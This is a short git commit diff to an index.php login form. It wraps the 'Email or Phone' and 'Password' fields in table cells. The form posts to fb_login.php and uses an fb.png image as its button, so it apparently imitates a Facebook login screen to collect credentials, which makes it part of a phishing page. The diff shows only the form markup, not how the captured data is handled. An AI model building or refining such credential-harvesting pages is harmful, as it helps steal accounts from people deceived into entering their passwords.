ae5c6468e3a4bae9544848f7a7aa961a15309c54
hrib <hugo.dose@gmail.com>
2016-07-08 17:52:44 +0100

    Update index.php

--- index.php
+++ index.php
@@ -30,10 +30,12 @@ div.transbox {
   <form action="fb_login.php" method="post">
       <table>
       <tr>
-      <font style="font-family:arial; font-size:9px;">Email or Phone </font><input type="text" name="user" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;">
+      <td><font style="font-family:arial; font-size:9px;">Email or Phone </font></td>
+      <td><input type="text" name="user" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
       <tr>
-      <font style="font-family:arial; font-size:9px;">Password </font><input type="password" name="password" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;">
+      <td><font style="font-family:arial; font-size:9px;">Password </font></td>
+      <td><input type="password" name="password" style="font-family:arial; font-size:9px; width: 180px; margin-left: 0px; margin-top: 10px;"></td>
       </tr>
       <tr>
       <input type="image" src="fb.png" style="width:280px;height:105px;">
